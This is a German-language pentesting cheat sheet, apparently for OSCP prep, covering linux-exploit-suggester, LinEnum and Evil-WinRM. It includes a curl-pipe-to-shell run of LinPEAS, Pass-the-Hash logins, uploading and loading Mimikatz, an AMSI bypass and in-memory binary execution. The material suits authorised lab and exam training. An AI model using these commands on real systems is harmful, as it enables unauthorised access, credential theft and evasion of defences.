# Linux PrivEsc Tools & Evil-WinRM

---

## Linux-Exploit-Suggester

### Was ist es?

Perl-Script das fehlende Security Patches identifiziert und passende Kernel Exploits vorschlägt.

### Download

```bash
# GitHub
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
```

### Usage

```bash
# Standard Run
./linux-exploit-suggester.sh

# Mit Kernel Version
./linux-exploit-suggester.sh -k 4.4.0-31

# Nur CVE IDs
./linux-exploit-suggester.sh --cve

# Output in File
./linux-exploit-suggester.sh > exploits.txt
```

### Output verstehen

```
Possible Exploits:
[+] [CVE-2016-5195] dirtycow
   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-0728] keyring
   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40003
```

### Häufige Linux Kernel Exploits

```bash
# Dirty COW (sehr zuverlässig)
CVE-2016-5195

# Dirty Pipe (neuere Kernel)
CVE-2022-0847

# PwnKit
CVE-2021-4034

# OverlayFS
CVE-2021-3493

# Netfilter
CVE-2021-22555
```

---

## LinEnum

### Was ist LinEnum?

Bash-Script für umfassende Linux-Enumeration. Fokus auf PrivEsc-Vectors.

### Download

```bash
# GitHub
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
```

### Usage

```bash
# Standard
./LinEnum.sh

# Thorough Mode (mehr Tests)
./LinEnum.sh -t

# Output in File
./LinEnum.sh > linenum.txt

# Mit Keyword Search
./LinEnum.sh -k password

# Thorough + Keywords
./LinEnum.sh -t -k password,mysql,root
```

### Was LinEnum checkt

```
- Kernel & OS Info
- User & Group Info
- Environmental Variables
- Network Information (interfaces, routes, connections)
- Running Processes
- Installed Software & Versions
- Cron Jobs
- Services
- SUID/SGID Files
- Writable Directories
- SSH Keys
- Database Credentials
- Password Files
- Interesting Files in /home
- Sudo Rights
```

### Output Sections

```bash
# Output ist farbcodiert:
Yellow = Potentially interesting
Red = Likely exploitable

# Wichtige Sections:
[+] Current user information
[+] Super user account(s)
[+] Sudo rights
[+] SUID files
[+] Cron jobs
[+] SSH keys
```

### Comparison: LinEnum vs LinPEAS

| Feature | LinEnum | LinPEAS |
|---------|---------|---------|
| **Sprache** | Bash | Bash/Binary |
| **Größe** | ~40KB | ~800KB |
| **Speed** | Schnell | Sehr schnell |
| **Umfang** | Gut | Exzellent |
| **Aktiv maintained** | Nein | Ja |
| **Best for** | Lightweight, simple | Comprehensive |

---

## Evil-WinRM

### Was ist Evil-WinRM?

PowerShell Remoting Shell (WinRM) Client für Linux. Das ultimative Tool für Windows Remote Access.

### Installation

```bash
# Via gem (Ruby)
sudo gem install evil-winrm

# Oder via apt (Kali)
sudo apt install evil-winrm

# Oder von GitHub
git clone https://github.com/Hackplayers/evil-winrm
cd evil-winrm
bundle install
```

### Basis-Usage

```bash
# Mit Passwort
evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD

# Mit NTLM Hash
evil-winrm -i TARGET_IP -u USERNAME -H NTLM_HASH

# Mit Kerberos
evil-winrm -i TARGET_IP -r REALM

# Custom Port
evil-winrm -i TARGET_IP -u USER -p PASS -P 5986

# SSL
evil-winrm -i TARGET_IP -u USER -p PASS -S
```

### Authentication Methods

```bash
# Username & Password
evil-winrm -i 192.168.1.100 -u administrator -p 'Password123!'

# Pass-the-Hash
evil-winrm -i 192.168.1.100 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# Mit Domain
evil-winrm -i 192.168.1.100 -u 'DOMAIN\administrator' -p 'Password123!'

# Private Key (Certificate Auth)
evil-winrm -i 192.168.1.100 -c cert.pem -k priv.key -S
```

### In der Evil-WinRM Shell

#### File Upload/Download

```powershell
# Upload
upload /local/path/file.exe

# Upload mit Custom Ziel
upload /local/file.exe C:\Windows\Temp\file.exe

# Download
download C:\Path\file.txt

# Download mit Custom Ziel
download C:\Path\file.txt /tmp/file.txt

# Multiple Uploads
upload /opt/tools/winPEAS.exe
upload /opt/tools/mimikatz.exe
```

#### PowerShell Module/Script Laden

```powershell
# PowerShell Script laden
menu

# Dann z.B.:
Invoke-Mimikatz.ps1  # Wenn in Exe-Files Ordner

# Bypass AMSI
Bypass-4MSI

# Load PowerShell Module
Import-Module .\PowerView.ps1
```

#### Services Management

```powershell
# Services via evil-winrm
services

# Specific Service
sc query wuauserv
```

#### Privilege Escalation Helpers

```powershell
# Invoke-Binary (execute in memory)
Invoke-Binary /opt/tools/SharpUp.exe

# Menu zeigt geladene Scripts
menu
```

### Evil-WinRM Features

```bash
# Automatisches Load von Scripts
# Lege Scripts in ~/.evil-winrm/ Ordner:
# - Exe-Files/      → Executables
# - PowerShell/     → PS1 Scripts

mkdir -p ~/.evil-winrm/Exe-Files
mkdir -p ~/.evil-winrm/PowerShell

# Dann automatisch verfügbar in Session via:
menu
```

### Advanced Options

```bash
# Custom Scripts Pfad
evil-winrm -i IP -u USER -p PASS -s /path/to/scripts

# Custom Executables Pfad
evil-winrm -i IP -u USER -p PASS -e /path/to/exes

# Beide
evil-winrm -i IP -u USER -p PASS -s /opt/ps1 -e /opt/exes

# No SSL Verification
evil-winrm -i IP -u USER -p PASS -S --no-ssl-check
```

### Troubleshooting

```bash
# Problem: "Error: An error of type WinRM::WinRMAuthorizationError happened"
# Lösung: User hat keine WinRM Rechte

# Problem: Connection Timeout
# Check WinRM Port (5985 HTTP, 5986 HTTPS)
nmap -p5985,5986 TARGET_IP

# Problem: SSL Certificate Error
# Use --no-ssl-check
evil-winrm -i IP -u USER -p PASS -S --no-ssl-check

# Problem: "Kerberos auth is not supported"
# Nutze -r REALM flag oder wechsle zu NTLM
```

### Vergleich zu anderen WinRM Tools

| Tool | Platform | Features | Beste Use-Case |
|------|----------|----------|----------------|
| **evil-winrm** | Linux | Upload, Download, Script load | OSCP Standard |
| **winrs** | Windows | Basic | Windows-to-Windows |
| **Enter-PSSession** | PowerShell | Native | PowerShell Remoting |
| **pth-winexe** | Linux | PTH Support | Pass-the-Hash only |

---

## Workflow: Linux PrivEsc

```bash
# 1. Initial Enum mit LinPEAS (umfassend)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 2. Kernel Exploit Check
./linux-exploit-suggester.sh

# 3. LinEnum für Details
./LinEnum.sh -t > linenum.txt

# 4. Manual Verification der Findings
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
```

---

## Workflow: Evil-WinRM

```bash
# 1. Credentials bekommen (via Kerberoasting, SMB, etc.)

# 2. Check WinRM Port
nmap -p5985,5986 TARGET_IP

# 3. Connect
evil-winrm -i TARGET_IP -u administrator -p 'Password123!'

# 4. In der Shell: Upload Tools
upload /opt/tools/winPEASx64.exe
upload /opt/tools/mimikatz.exe

# 5. Enumeration
.\winPEASx64.exe

# 6. Privilege Escalation
# ... basierend auf Findings

# 7. Download Loot
download C:\Users\Administrator\Desktop\proof.txt
```

---

## Quick Reference

### linux-exploit-suggester
```bash
./linux-exploit-suggester.sh
./linux-exploit-suggester.sh -k $(uname -r)
```

### LinEnum
```bash
./LinEnum.sh -t -k password
./LinEnum.sh > linenum.txt
```

### evil-winrm
```bash
# Password
evil-winrm -i IP -u USER -p PASS

# Pass-the-Hash
evil-winrm -i IP -u USER -H NTLM_HASH

# In Shell:
upload /local/file
download C:\remote\file
menu
```

---

## OSCP Exam Tips

### Linux Tools

1. **LinPEAS zuerst** - Umfassendste Enum
2. **linux-exploit-suggester** - Kernel exploits checken
3. **LinEnum für Backup** - Falls LinPEAS fehlt
4. **Manual Verification** - sudo -l, SUID, cronjobs
5. **Kernel Exploits = Last Resort** - Können unstable sein

### Evil-WinRM

1. **Immer testen** - Wenn WinRM Port (5985/5986) offen
2. **PTH funktioniert** - Pass-the-Hash ist Gold
3. **Upload-Ordner vorbereiten** - ~/.evil-winrm/ mit Tools
4. **Bypass-4MSI** - AMSI bypass built-in
5. **menu benutzen** - Zeigt verfügbare Scripts
6. **Download für Loot** - Proof.txt, Hashes, etc.
7. **Alternative zu PSExec** - Oft weniger geblockt
8. **Kerberos Auth** - Mit -r REALM möglich

---

## Resources

- linux-exploit-suggester: https://github.com/mzet-/linux-exploit-suggester
- LinEnum: https://github.com/rebootuser/LinEnum
- evil-winrm: https://github.com/Hackplayers/evil-winrm
- HackTricks Linux PrivEsc: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- GTFOBins: https://gtfobins.github.io/
